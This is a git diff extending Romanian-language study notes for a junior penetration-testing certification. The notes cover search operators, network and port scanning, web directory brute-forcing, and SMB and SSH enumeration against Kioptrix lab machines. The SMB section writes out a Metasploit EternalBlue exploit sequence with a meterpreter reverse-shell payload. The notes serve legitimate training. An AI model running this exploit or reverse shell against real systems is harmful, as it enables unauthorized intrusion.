@@ -1,5 +1,5 @@
-# PJPT 
-24 ore lab + 2-3 zile raport
+# PJPT()
+descriere pe scurt 2 zile lab + 2 zile raport 2 incercari
 
 ## Coursuri recomandate:
 1. Practical Ethical Hacking - The complete Course
@@ -265,3 +265,110 @@ amass enum -d tesla.com
 - whatweb (CLI) - scanner CLI care detectează servere, CMS-uri, plugin-uri și metadate din pagini web; mai „agresiv” și customizabil prin pluginuri, util pentru fingerprinting web
 
 ### Information Gathering with Burp Suite:
+#### Burp Suite:
+#TODO scan with burp suite or maybe not aici putem sa scoatem informatie despre web site:)
+#### Google Fu:
+Unele exemple:
+```
+- "exact phrase"        - o fraza care dorim sa fie gasita exact 
+- site:                 - platforma pe care dorim sa gasim informatiea
+- -                     - permite sa excludem unele fraze ca nu ne sunt interesante (sau platforme) `site:tesla.com -www`
+- filetype:             - ce tip de fisiere dorim sa gasim
+...
+```
+Este un resurs unde sunt strinse metodele de a gasi informatia: https://github.com/cipher387/Advanced-search-operators-list?tab=readme-ov-file#searchengines
+
+Alta resursa pentru **Google FU**: https://tryhackme.com/resources/blog/google-fu
+
+#TODO OSINT course
+
+## Scanning & Enumeration:
+### Port scans:
+Aici o sa avem nevoie de **Kioptrix** in cazul meu o sa fie pe VMware:
+
+Kioptrix Download: https://tcm-sec.com/kioptrix
+
+Sau daca vrem toate versiunele: https://www.vulnhub.com/series/kioptrix,8/
+
+Parcurgerea acestei masine o sa fie descrisa detaliata aici [Kioptrix Walkthrough](Kioptrix_Walkthrough.md) mai departe o sa fie doar unele comenzi/utilite utile.
+
+`netdiscove`        - scanează pasiv sau activ rețeaua specificată (de exemplu 192.168.1.0/24) pentru a identifica dispozitivele conectate și afișează adresele lor IP, MAC și producătorul plăcii de rețea. `-r` - pentru range
+```bash
+netdiscover -r <IP>/<CIDR>
+```
+
+`arp-scan`          - scanează rețeaua locală (broadcast domain) trimițând pachete ARP către toate adresele posibile și afișează lista dispozitivelor active cu IP, MAC și vendor.
+```bash
+arp-scan -l
+```
+`nmap`              - un instrument open-source de explorare şi auditare a reţelelor care detectează gazde active, porturi deschise, servicii şi versiuni, identifică sistemul de operare şi permite scripturi pentru flaguri avem fisierul  [nmap cheatsheet](nmap-cheatsheet-19.md):
+
+Cel mai simplu exemplu:
+```bash
+nmap -T4 -p- -A <IP>
+```
+Net-discoveru(ARP nivelul L2) cu `nmap`:
+```bash
+nmap -sn <IP>/<CIDR>
+```
+### Enumerating HTTP/HTTPS:
+`nikto`             - scanner web de vulnerabilități care verifică servere HTTP/HTTPS pentru fișiere/configurații/CGI periculoase și probleme cunoscute.
+
+Exemplu:
+```bash
+nikto -h http://<IP>
+```
+
+`dirbuster`         - tool GUI (Java) pentru brute-forcing de directoare și fișiere pe un server web folosind wordlist-uri; util pentru găsirea resurselor ascunse.
+
+`dirb`              - utilitar CLI simplu pentru bruteforce de directoare/fișiere web folosind liste de cuvinte; afișează răspunsurile HTTP relevante.
+
+`gobuster`          - instrument CLI rapid pentru enumerație de directoare, fișiere sau virtual host-uri; folosește concurență (threading) și este bine optimizat pentru scanări rapide.
+
+`ffuf`              - fast web fuzzer/dir-buster modern, foarte flexibil (parametri, fuzzing de query params, ext, etc.) și eficient pentru găsirea resurselor web.
+
+`dirseach`          - scanner Python pentru directoare/fișiere web, recursiv, suportă extensii multiple şi output detaliat. 
+
+### Enumerating SMB:
+Metasploit (exemple de bază):
+```bash
+msfconsole
+search name:ms17_010       
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS <IP>
+set RPORT 445
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <tua_IP>
+exploit
+# sau: run
+```
+
+Listare share-uri, users, versiuni, politici, ACL-uri.
+`smbclient`       - client SMB (listare share-uri, conectare anonimă).
+```bash
+smbclient -L //<IP> -N                          # -N = fără parolă
+smbclient //<IP>/<SHARE> -U username
+```
+`enum4linux`      - script Perl pentru enumerare SMB/NetBIOS (users, shares, OS, group membership).
+```bash
+enum4linux -a <IP>
+```
+
+### Enumerating SSH:
+O simpla conexiune poate sa ne arate banerul(unde poate sa fie versiunea si alta informatie utila) pentru serviciul dat:
+
+Banner grab:
+```bash
+nc -nv <IP> 22
+#sau
+telnet <IP> 22 
+```
+### Researching Potential Vulnerabilities:
+In sectiunea data avem 2 instrumente principale pentru a exploata vulnerabilitatile gasite:
+
+[`rapid7`](https://www.rapid7.com/)         - companie şi platformă (ex: Metasploit, InsightVM) care oferă unelte comerciale şi baze de date pentru scanare, exploatare şi gestiunea vulnerabilităţilor.
+[`exploit-db`](https://www.exploit-db.com/) - arhivă gratuită cu exploit-uri şi PoC-uri publice; utilă pentru a căuta exploituri existente pentru o vulnerabilitate identificată.
+
+
+## Scanning with Nessus: 
